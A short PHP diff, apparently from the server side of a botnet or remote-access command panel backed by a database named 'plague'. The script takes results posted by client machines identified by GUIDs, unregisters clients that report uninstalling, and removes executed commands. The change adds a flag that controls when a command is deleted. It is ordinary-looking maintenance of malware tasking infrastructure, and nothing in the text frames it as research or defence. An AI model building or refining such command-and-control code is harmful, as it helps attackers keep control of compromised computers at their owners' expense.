@@ -24,6 +24,8 @@ if(!ConnectDB('plague')){
 	die('Failed to connect to the database.');
 }
 
+$CanRemove = !isset($_POST['Continue']);
+
 switch($RT){
 	case RT_STRING:{
 		if(!isset($_POST['Result'])){
@@ -32,6 +34,7 @@ switch($RT){
 	    } else $R = $_POST['Result'];
 		SetResult($GUID, $R);
 		if($R=='Uninstalling...'){
+			$CanRemove = false;
 			RemoveClient($GUID);
 		}
 	} break;
@@ -51,7 +54,7 @@ switch($RT){
 	} break;
 }
 
-if(!isset($_POST['Continue'])) RemoveCommand($GUID, $ID);
+if($CanRemove) RemoveCommand($GUID, $ID);
 
 echo("Result accepted. ^_^");
 
